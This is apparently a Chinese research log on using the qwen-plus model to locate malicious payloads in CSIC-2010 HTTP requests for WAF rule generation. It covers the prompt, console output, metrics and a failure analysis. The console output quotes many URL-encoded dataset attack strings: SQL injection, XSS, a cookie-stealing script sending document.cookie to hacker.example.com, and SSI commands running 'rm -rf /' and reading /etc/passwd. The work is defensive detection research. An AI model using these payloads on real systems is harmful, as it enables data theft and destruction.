# 恶意载荷定位及自动WAF规则转化

## 一、Log

1. 数据集同论文，采用CSIC-2010-http-dataset。

   > - CSIC-2010-http-dataset：https://www.isi.csic.es/dataset/ 或 [HTTP DATASET CSIC 2010](https://web.archive.org/web/20200211032543/https://www.isi.csic.es/dataset/)，但上述两个地址应该都无法获得数据集，真实援引自[baksakal/HTTP-DATASET-CSIC-2010-MACHINE-LEARNING-GUI-AND-SERVER](https://github.com/baksakal/HTTP-DATASET-CSIC-2010-MACHINE-LEARNING-GUI-AND-SERVER?tab=readme-ov-file)，作者baksakal在其代码中附上了该数据集。

2. 从数据集中的`normalTrafficTest.txt`和`anomalousTrafficTest.txt`分别提取50条数据，头部分容易切分，URL和body按`&key=word`的格式尝试切分，如果满足就切分，否则保留原格式，输出到`.\msu\csic_msu_data.json`

3. 随后调用大模型进行预测，判断结果在`output.txt`，其中误报（没有检测出来的）：

   ```json
   {
       "id": "CSIC_anomalous_65",
       "type": "anomalous",
       "msu_list": [
         "GET",
         "http://localhost:8080/tienda1/publico/autenticar.jsp",
         "modo=entrar",
         "login=modestin",
         "pwd=es%27pec%27ia%2Fl",
         "remember=off",
         "B1=Entrar",
         "User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
         "Pragma: no-cache",
         "Cache-control: no-cache",
         "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
         "Accept-Encoding: x-gzip, x-deflate, gzip, deflate",
         "Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5",
         "Accept-Language: en",
         "Host: localhost:8080",
         "Cookie: JSESSIONID=A3E4D73DCF6DF45FAB3C6D63B8BB2FA1",
         "Connection: close"
       ]
     }，{
       "id": "CSIC_anomalous_66",
       "type": "anomalous",
       "msu_list": [
         "POST",
         "http://localhost:8080/tienda1/publico/autenticar.jsp",
         "User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
         "Pragma: no-cache",
         "Cache-control: no-cache",
         "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
         "Accept-Encoding: x-gzip, x-deflate, gzip, deflate",
         "Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5",
         "Accept-Language: en",
         "Host: localhost:8080",
         "Cookie: JSESSIONID=DFE9C4D27F39BAFFC41C9BFEFABDDA62",
         "Content-Type: application/x-www-form-urlencoded",
         "Connection: close",
         "Content-Length: 71",
         "modo=entrar",
         "login=modestin",
         "pwd=es%27pec%27ia%2Fl",
         "remember=off",
         "B1=Entrar"
       ]
     }，{
       "id": "CSIC_anomalous_17",
       "type": "anomalous",
       "msu_list": [
         "GET",
         "http://localhost:8080/IISSamples/sdk/asp/applications/Application_VBScript.asp",
         "User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
         "Pragma: no-cache",
         "Cache-control: no-cache",
         "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
         "Accept-Encoding: x-gzip, x-deflate, gzip, deflate",
         "Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5",
         "Accept-Language: en",
         "Host: localhost:8080",
         "Cookie: JSESSIONID=7A7810BAEDA706C77CC9C2F19311BFB5",
         "Connection: close"
       ]
     }，{
       "id": "CSIC_anomalous_95",
       "type": "anomalous",
       "msu_list": [
         "POST",
         "http://localhost:8080/tienda1/publico/registro.jsp",
         "User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
         "Pragma: no-cache",
         "Cache-control: no-cache",
         "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
         "Accept-Encoding: x-gzip, x-deflate, gzip, deflate",
         "Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5",
         "Accept-Language: en",
         "Host: localhost:8080",
         "Cookie: JSESSIONID=F55DAACCFFE60B7C651959C1B7E70D1A",
         "Content-Type: application/x-www-form-urlencoded",
         "Connection: close",
         "Content-Length: 254",
         "modo=registro",
         "login=audy",
         "password=8a9c27",
         "nombre=%3FP%27r%F3spero",
         "apellidos=Ricart+Rizzi",
         "email=taube%40farmaoferta.bi",
         "dni=94839637B",
         "direccion=Calle+San+Indalencio+168+",
         "ciudad=San+Jos%E9+del+Valle",
         "cp=33783",
         "provincia=Zamora",
         "ntc=8868360012752422",
         "B1=Registrar"
       ]
     }，{
       "id": "CSIC_anomalous_94",
       "type": "anomalous",
       "msu_list": [
         "GET",
         "http://localhost:8080/tienda1/publico/registro.jsp",
         "modo=registro",
         "login=audy",
         "password=8a9c27",
         "nombre=%3FP%27r%F3spero",
         "apellidos=Ricart+Rizzi",
         "email=taube%40farmaoferta.bi",
         "dni=94839637B",
         "direccion=Calle+San+Indalencio+168+",
         "ciudad=San+Jos%E9+del+Valle",
         "cp=33783",
         "provincia=Zamora",
         "ntc=8868360012752422",
         "B1=Registrar",
         "User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
         "Pragma: no-cache",
         "Cache-control: no-cache",
         "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
         "Accept-Encoding: x-gzip, x-deflate, gzip, deflate",
         "Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5",
         "Accept-Language: en",
         "Host: localhost:8080",
         "Cookie: JSESSIONID=F43C94369DBDA1B32F34ECB3BEC2CB16",
         "Connection: close"
       ]
     }
   ```

   误报情况大体上是这两点：

   1. **探针型SQL注入（模糊测试）**：比如样本 65/66 的密码字段：`pwd=es%27pec%27ia%2Fl` ，样本 94/95 的姓名字段：`nombre=%3FP%27r%F3spero`，这些只是一个探针，检测数据库是否存在漏洞：如果因为这些特殊字符(`'`，即 `%27`)报错了，就证明存在SQL注入漏洞，可以进行攻击。
   2. **敏感目录遍历/已知漏洞探测**：17样本中的`http://localhost:8080/IISSamples/sdk/asp/applications/Application_VBScript.asp`，其中`/IISSamples/` 是早期微软 IIS 服务器默认安装的演示脚本目录，其中包含了大量广为人知的高危漏洞。



## 二、中期汇报

### 1. 目前的工作

1. 设计解析器，拆分HTTP请求为MSU；

2. 调用qwen-plus模型，按论文中的提示词，设计自动定位（到MSU）的恶意载荷定位器；

   > 提示词如下：
   >
   > ```python
   > SYSTEM_PROMPT = """Your task is to locate malicious payloads in an HTTP request.
   > The HTTP request will be divided into minimal semantic units (MSUs), and the input is an array of strings, where each string represents an MSU of the HTTP request.
   > The output should be a dictionary in JSON format, where the key is a string from the input array, and the value is 0 or 1. A value of 0 indicates that the unit does not contain malicious payloads, and a value of 1 means otherwise.
   > Please return ONLY the JSON dictionary, without any markdown formatting or explanations."""
   > ```

3. 自动结果分析与评价。



### 2. 实验结果

1. 采用`CSIC-2010-HTTP-DATASET`数据集，和论文中一致。从正常、恶意流量中提取各五十条。

2. 切割成MSU后，作为输入的一部分，调用`qwen-plus`模型以此为单位判断（即0或1）是否含有恶意载荷，结果如下（控制台输出）：

   ```bash
   [Info] 开始调用 qwen-plus 进行恶意载荷定位...
   [Info] 共计需处理请求数量: 100
   
       [Info] ID:CSIC_normal_0 未检测到异常载荷。
       [Info] ID:CSIC_normal_3 未检测到异常载荷。
       [Info] ID:CSIC_normal_4 未检测到异常载荷。
       [Info] ID:CSIC_normal_2 未检测到异常载荷。
       [Info] ID:CSIC_normal_1 未检测到异常载荷。
       [Info] ID:CSIC_normal_5 未检测到异常载荷。
       [Info] ID:CSIC_normal_6 未检测到异常载荷。
       [Info] ID:CSIC_normal_7 未检测到异常载荷。
       [Info] ID:CSIC_normal_8 未检测到异常载荷。
       [Info] ID:CSIC_normal_9 未检测到异常载荷。
       [Info] ID:CSIC_normal_10 未检测到异常载荷。
       [Info] ID:CSIC_normal_13 未检测到异常载荷。
       [Info] ID:CSIC_normal_11 未检测到异常载荷。
       [Info] ID:CSIC_normal_12 未检测到异常载荷。
       [Info] ID:CSIC_normal_14 未检测到异常载荷。
       [Info] ID:CSIC_normal_16 未检测到异常载荷。
       [Info] ID:CSIC_normal_17 未检测到异常载荷。
       [Info] ID:CSIC_normal_18 未检测到异常载荷。
       [Info] ID:CSIC_normal_15 未检测到异常载荷。
       [Info] ID:CSIC_normal_19 未检测到异常载荷。
       [Info] ID:CSIC_normal_20 未检测到异常载荷。
       [Info] ID:CSIC_normal_21 未检测到异常载荷。
       [Info] ID:CSIC_normal_22 未检测到异常载荷。
       [Info] ID:CSIC_normal_23 未检测到异常载荷。
       [Info] ID:CSIC_normal_24 未检测到异常载荷。
       [Info] ID:CSIC_normal_25 未检测到异常载荷。
       [Info] ID:CSIC_normal_28 未检测到异常载荷。
       [Info] ID:CSIC_normal_29 未检测到异常载荷。
       [Info] ID:CSIC_normal_26 未检测到异常载荷。
       [Info] ID:CSIC_normal_27 未检测到异常载荷。
       [Info] ID:CSIC_normal_30 未检测到异常载荷。
       [Info] ID:CSIC_normal_31 未检测到异常载荷。
       [Info] ID:CSIC_normal_32 未检测到异常载荷。
       [Info] ID:CSIC_normal_33 未检测到异常载荷。
       [Info] ID:CSIC_normal_34 未检测到异常载荷。
       [Info] ID:CSIC_normal_35 未检测到异常载荷。
       [Info] ID:CSIC_normal_36 未检测到异常载荷。
       [Info] ID:CSIC_normal_37 未检测到异常载荷。
       [Info] ID:CSIC_normal_38 未检测到异常载荷。
       [Info] ID:CSIC_normal_39 未检测到异常载荷。
       [Info] ID:CSIC_normal_40 未检测到异常载荷。
       [Info] ID:CSIC_normal_41 未检测到异常载荷。
       [Info] ID:CSIC_normal_43 未检测到异常载荷。
       [Info] ID:CSIC_normal_42 未检测到异常载荷。
       [Info] ID:CSIC_normal_44 未检测到异常载荷。
       [Info] ID:CSIC_normal_45 未检测到异常载荷。
       [Info] ID:CSIC_normal_46 未检测到异常载荷。
       [Info] ID:CSIC_normal_49 未检测到异常载荷。
       [Info] ID:CSIC_normal_47 未检测到异常载荷。
       [Info] ID:CSIC_normal_48 未检测到异常载荷。
       [Info] ID:CSIC_anomalous_0 识别到恶意参数: ['cantidad=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25']
       [Info] ID:CSIC_anomalous_1 识别到恶意参数: ['cantidad=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25']
       [Info] ID:CSIC_anomalous_17 未检测到异常载荷。
       [Info] ID:CSIC_anomalous_5 识别到恶意参数: ['login=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org']
       [Info] ID:CSIC_anomalous_6 识别到恶意参数: ['login=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org']
       [Info] ID:CSIC_anomalous_18 识别到恶意参数: ['precio=183%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--']
       [Info] ID:CSIC_anomalous_19 识别到恶意参数: ['precio=183%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--']
       [Info] ID:CSIC_anomalous_25 识别到恶意参数: ['modo=registro%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E']
       [Info] ID:CSIC_anomalous_26 识别到恶意参数: ['modo=registro%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E']
       [Info] ID:CSIC_anomalous_45 识别到恶意参数: ['ntc=4096797311989091sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E']
       [Info] ID:CSIC_anomalous_55 识别到恶意参数: ['cantidad=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org']
       [Info] ID:CSIC_anomalous_46 识别到恶意参数: ['ntc=4096797311989091sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E']
       [Info] ID:CSIC_anomalous_56 识别到恶意参数: ['cantidad=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org']
       [Info] ID:CSIC_anomalous_63 识别到恶意参数: ['login=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org']
       [Info] ID:CSIC_anomalous_64 识别到恶意参数: ['login=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org']
       [Info] ID:CSIC_anomalous_65 未检测到异常载荷。
       [Info] ID:CSIC_anomalous_66 未检测到异常载荷。
       [Info] ID:CSIC_anomalous_77 识别到恶意参数: ['errorMsg=Credenciales+incorrectasbob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org']
       [Info] ID:CSIC_anomalous_78 识别到恶意参数: ['errorMsg=Credenciales+incorrectasbob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org']
       [Info] ID:CSIC_anomalous_79 识别到恶意参数: ['errorMsg=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C']
       [Info] ID:CSIC_anomalous_80 识别到恶意参数: ['errorMsg=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C']
       [Info] ID:CSIC_anomalous_92 识别到恶意参数: ['password=8a9c27%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--']
       [Info] ID:CSIC_anomalous_98 识别到恶意参数: ['B2=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org']
       [Info] ID:CSIC_anomalous_93 识别到恶意参数: ['password=8a9c27%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--']
       [Info] ID:CSIC_anomalous_94 未检测到异常载荷。
       [Info] ID:CSIC_anomalous_95 未检测到异常载荷。
       [Info] ID:CSIC_anomalous_113 识别到恶意参数: ['http://localhost:8080/scripts/tools/mkilog.exe']
       [Info] ID:CSIC_anomalous_99 识别到恶意参数: ['B2=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org']
       [Info] ID:CSIC_anomalous_143 识别到恶意参数: ['B2=Vaciar+carritoparos%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29']
       [Info] ID:CSIC_anomalous_136 识别到恶意参数: ['apellidos=Guimera+Faraco%22+AND+%221%22%3D%221']
       [Info] ID:CSIC_anomalous_137 识别到恶意参数: ['apellidos=Guimera+Faraco%22+AND+%221%22%3D%221']
       [Info] ID:CSIC_anomalous_144 识别到恶意参数: ['B2=Vaciar+carritoparos%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29']
       [Info] ID:CSIC_anomalous_167 识别到恶意参数: ['modo=entrar%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25']
       [Info] ID:CSIC_anomalous_168 识别到恶意参数: ['modo=entrar%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25']
       [Info] ID:CSIC_anomalous_169 识别到恶意参数: ['pwd=%2C%27caire']
       [Info] ID:CSIC_anomalous_170 识别到恶意参数: ['pwd=%2C%27caire']
       [Info] ID:CSIC_anomalous_203 识别到恶意参数: ['nombre=%27+AND+%271%27%3D%271']
       [Info] ID:CSIC_anomalous_204 识别到恶意参数: ['nombre=%27+AND+%271%27%3D%271']
       [Info] ID:CSIC_anomalous_213 识别到恶意参数: ['id=1%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--']
       [Info] ID:CSIC_anomalous_214 识别到恶意参数: ['id=1%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--']
       [Info] ID:CSIC_anomalous_226 识别到恶意参数: ['apellidos=Laspiur%27+AND+%271%27%3D%271']
       [Info] ID:CSIC_anomalous_227 识别到恶意参数: ['apellidos=Laspiur%27+AND+%271%27%3D%271']
       [Info] ID:CSIC_anomalous_230 识别到恶意参数: ['dni=52%2763986G']
       [Info] ID:CSIC_anomalous_235 识别到恶意参数: ['B2=Vaciar+carrito%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E']
       [Info] ID:CSIC_anomalous_231 识别到恶意参数: ['dni=52%2763986G']
       [Info] ID:CSIC_anomalous_236 识别到恶意参数: ['B2=Vaciar+carrito%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E']
       [Info] ID:CSIC_anomalous_246 识别到恶意参数: ['login=kh%27ez%3Fri']
       [Info] ID:CSIC_anomalous_251 识别到恶意参数: ['id=2%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--']
       [Info] ID:CSIC_anomalous_247 识别到恶意参数: ['login=kh%27ez%3Fri']
       [Info] ID:CSIC_anomalous_252 识别到恶意参数: ['id=2%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--']
   
   [Info] 任务结束。成功生成 100 条结果。
   [Info] 总耗时: 152.33 秒！
   [Info] 数据已保存至: .\llm_output\llm_predicted_results.json
   ```

3. 实验结果评估：

   ```
   Total Processed: 100
   True Positives (TP): 45
   True Negatives (TN): 50
   False Positives (FP): 0
   False Negatives (FN): 5
   --------------------
   Accuracy:  95.00%
   Precision: 100.00%
   Recall:    90.00%
   ```

4. 失败案例分析：

      ```json
      {
          "id": "CSIC_anomalous_65",
          "type": "anomalous",
          "msu_list": [
            "GET",
            "http://localhost:8080/tienda1/publico/autenticar.jsp",
            "modo=entrar",
            "login=modestin",
            "pwd=es%27pec%27ia%2Fl",
            "remember=off",
            "B1=Entrar",
            "User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
            "Pragma: no-cache",
            "Cache-control: no-cache",
            "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding: x-gzip, x-deflate, gzip, deflate",
            "Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5",
            "Accept-Language: en",
            "Host: localhost:8080",
            "Cookie: JSESSIONID=A3E4D73DCF6DF45FAB3C6D63B8BB2FA1",
            "Connection: close"
          ]
        }，{
          "id": "CSIC_anomalous_66",
          "type": "anomalous",
          "msu_list": [
            "POST",
            "http://localhost:8080/tienda1/publico/autenticar.jsp",
            "User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
            "Pragma: no-cache",
            "Cache-control: no-cache",
            "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding: x-gzip, x-deflate, gzip, deflate",
            "Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5",
            "Accept-Language: en",
            "Host: localhost:8080",
            "Cookie: JSESSIONID=DFE9C4D27F39BAFFC41C9BFEFABDDA62",
            "Content-Type: application/x-www-form-urlencoded",
            "Connection: close",
            "Content-Length: 71",
            "modo=entrar",
            "login=modestin",
            "pwd=es%27pec%27ia%2Fl",
            "remember=off",
            "B1=Entrar"
          ]
        }，{
          "id": "CSIC_anomalous_17",
          "type": "anomalous",
          "msu_list": [
            "GET",
            "http://localhost:8080/IISSamples/sdk/asp/applications/Application_VBScript.asp",
            "User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
            "Pragma: no-cache",
            "Cache-control: no-cache",
            "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding: x-gzip, x-deflate, gzip, deflate",
            "Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5",
            "Accept-Language: en",
            "Host: localhost:8080",
            "Cookie: JSESSIONID=7A7810BAEDA706C77CC9C2F19311BFB5",
            "Connection: close"
          ]
        }，{
          "id": "CSIC_anomalous_95",
          "type": "anomalous",
          "msu_list": [
            "POST",
            "http://localhost:8080/tienda1/publico/registro.jsp",
            "User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
            "Pragma: no-cache",
            "Cache-control: no-cache",
            "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding: x-gzip, x-deflate, gzip, deflate",
            "Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5",
            "Accept-Language: en",
            "Host: localhost:8080",
            "Cookie: JSESSIONID=F55DAACCFFE60B7C651959C1B7E70D1A",
            "Content-Type: application/x-www-form-urlencoded",
            "Connection: close",
            "Content-Length: 254",
            "modo=registro",
            "login=audy",
            "password=8a9c27",
            "nombre=%3FP%27r%F3spero",
            "apellidos=Ricart+Rizzi",
            "email=taube%40farmaoferta.bi",
            "dni=94839637B",
            "direccion=Calle+San+Indalencio+168+",
            "ciudad=San+Jos%E9+del+Valle",
            "cp=33783",
            "provincia=Zamora",
            "ntc=8868360012752422",
            "B1=Registrar"
          ]
        }，{
          "id": "CSIC_anomalous_94",
          "type": "anomalous",
          "msu_list": [
            "GET",
            "http://localhost:8080/tienda1/publico/registro.jsp",
            "modo=registro",
            "login=audy",
            "password=8a9c27",
            "nombre=%3FP%27r%F3spero",
            "apellidos=Ricart+Rizzi",
            "email=taube%40farmaoferta.bi",
            "dni=94839637B",
            "direccion=Calle+San+Indalencio+168+",
            "ciudad=San+Jos%E9+del+Valle",
            "cp=33783",
            "provincia=Zamora",
            "ntc=8868360012752422",
            "B1=Registrar",
            "User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
            "Pragma: no-cache",
            "Cache-control: no-cache",
            "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding: x-gzip, x-deflate, gzip, deflate",
            "Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5",
            "Accept-Language: en",
            "Host: localhost:8080",
            "Cookie: JSESSIONID=F43C94369DBDA1B32F34ECB3BEC2CB16",
            "Connection: close"
          ]
        }
      ```

      误报情况大体上是这两点：

      1. **探针型SQL注入（模糊测试）**：比如样本 65/66 的密码字段：`pwd=es%27pec%27ia%2Fl` ，样本 94/95 的姓名字段：`nombre=%3FP%27r%F3spero`，这些只是一个探针，检测数据库是否存在漏洞：如果因为这些特殊字符(`'`，即 `%27`)报错了，就证明存在SQL注入漏洞，可以进行攻击。
      2. **敏感目录遍历/已知漏洞探测**：17样本中的`http://localhost:8080/IISSamples/sdk/asp/applications/Application_VBScript.asp`，其中`/IISSamples/` 是早期微软 IIS 服务器默认安装的演示脚本目录，其中包含了大量广为人知的高危漏洞。



### 3. 未来的工作

1. 目前定位器存在速度较慢、成本较高，以及一定的误报漏报情况。未来需要优化。
1. 尚未完成从恶意载荷的判断、定位到WAF规则转换的步骤，这是未来工作的重点。



## 三、最终版本

1. 拓展数据集为normal、anomalous各300条，并修改并发为10，进行测试，结果如下：

   ```
   [Info] 任务结束。成功生成 600 条结果。
   [Info] 总耗时: 451.88 秒！
   
   Total Processed: 600
   True Positives (TP): 281	#恶意判断为恶意
   True Negatives (TN): 300	#正常判断为正常
   False Positives (FP): 0		#正常判断为恶意
   False Negatives (FN): 19	#恶意判断为正常
   --------------------
   Accuracy:  96.83%			#（TP+TN）/Total：总的准确率
   Precision: 100.00%			#TP/（TP+FP）：查准率，即判断为恶意的有多少是真恶意
   Recall:    93.67%			#TP/（TP+FN）：召回率，即真恶意有多少判断成功的
   
   消耗大约510K tokens
   ```

   即：

   |     指标     |  数据   |
   | :----------: | :-----: |
   |     Acc      | 96.83%  |
   |     Pre      | 100.00% |
   |     Rec      | 93.67%  |
   |     Time     | 451.88s |
   |  SingleTime  |  0.75s  |
   |    Tokens    |  510K   |
   | SingleTokens |  0.85K  |

2. 一些失败样例：

   ```json
   {
       "id": "CSIC_anomalous_66",
       "type": "anomalous",
       "msu_list": [
         "POST",
         "http://localhost:8080/tienda1/publico/autenticar.jsp",
         "User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
         "Pragma: no-cache",
         "Cache-control: no-cache",
         "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
         "Accept-Encoding: x-gzip, x-deflate, gzip, deflate",
         "Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5",
         "Accept-Language: en",
         "Host: localhost:8080",
         "Cookie: JSESSIONID=DFE9C4D27F39BAFFC41C9BFEFABDDA62",
         "Content-Type: application/x-www-form-urlencoded",
         "Connection: close",
         "Content-Length: 71",
         "modo=entrar",
         "login=modestin",
         "pwd=es%27pec%27ia%2Fl",
         "remember=off",
         "B1=Entrar"
       ]
     },{
       "id": "CSIC_anomalous_65",
       "type": "anomalous",
       "msu_list": [
         "GET",
         "http://localhost:8080/tienda1/publico/autenticar.jsp",
         "modo=entrar",
         "login=modestin",
         "pwd=es%27pec%27ia%2Fl",
         "remember=off",
         "B1=Entrar",
         "User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
         "Pragma: no-cache",
         "Cache-control: no-cache",
         "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
         "Accept-Encoding: x-gzip, x-deflate, gzip, deflate",
         "Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5",
         "Accept-Language: en",
         "Host: localhost:8080",
         "Cookie: JSESSIONID=A3E4D73DCF6DF45FAB3C6D63B8BB2FA1",
         "Connection: close"
       ]
     },{
       "id": "CSIC_anomalous_17",
       "type": "anomalous",
       "msu_list": [
         "GET",
         "http://localhost:8080/IISSamples/sdk/asp/applications/Application_VBScript.asp",
         "User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
         "Pragma: no-cache",
         "Cache-control: no-cache",
         "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
         "Accept-Encoding: x-gzip, x-deflate, gzip, deflate",
         "Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5",
         "Accept-Language: en",
         "Host: localhost:8080",
         "Cookie: JSESSIONID=7A7810BAEDA706C77CC9C2F19311BFB5",
         "Connection: close"
       ]
     },{
       "id": "CSIC_anomalous_95",
       "type": "anomalous",
       "msu_list": [
         "POST",
         "http://localhost:8080/tienda1/publico/registro.jsp",
         "User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
         "Pragma: no-cache",
         "Cache-control: no-cache",
         "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
         "Accept-Encoding: x-gzip, x-deflate, gzip, deflate",
         "Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5",
         "Accept-Language: en",
         "Host: localhost:8080",
         "Cookie: JSESSIONID=F55DAACCFFE60B7C651959C1B7E70D1A",
         "Content-Type: application/x-www-form-urlencoded",
         "Connection: close",
         "Content-Length: 254",
         "modo=registro",
         "login=audy",
         "password=8a9c27",
         "nombre=%3FP%27r%F3spero",
         "apellidos=Ricart+Rizzi",
         "email=taube%40farmaoferta.bi",
         "dni=94839637B",
         "direccion=Calle+San+Indalencio+168+",
         "ciudad=San+Jos%E9+del+Valle",
         "cp=33783",
         "provincia=Zamora",
         "ntc=8868360012752422",
         "B1=Registrar"
       ]
     },{
       "id": "CSIC_anomalous_94",
       "type": "anomalous",
       "msu_list": [
         "GET",
         "http://localhost:8080/tienda1/publico/registro.jsp",
         "modo=registro",
         "login=audy",
         "password=8a9c27",
         "nombre=%3FP%27r%F3spero",
         "apellidos=Ricart+Rizzi",
         "email=taube%40farmaoferta.bi",
         "dni=94839637B",
         "direccion=Calle+San+Indalencio+168+",
         "ciudad=San+Jos%E9+del+Valle",
         "cp=33783",
         "provincia=Zamora",
         "ntc=8868360012752422",
         "B1=Registrar",
         "User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
         "Pragma: no-cache",
         "Cache-control: no-cache",
         "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
         "Accept-Encoding: x-gzip, x-deflate, gzip, deflate",
         "Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5",
         "Accept-Language: en",
         "Host: localhost:8080",
         "Cookie: JSESSIONID=F43C94369DBDA1B32F34ECB3BEC2CB16",
         "Connection: close"
       ]
     },
   ```

   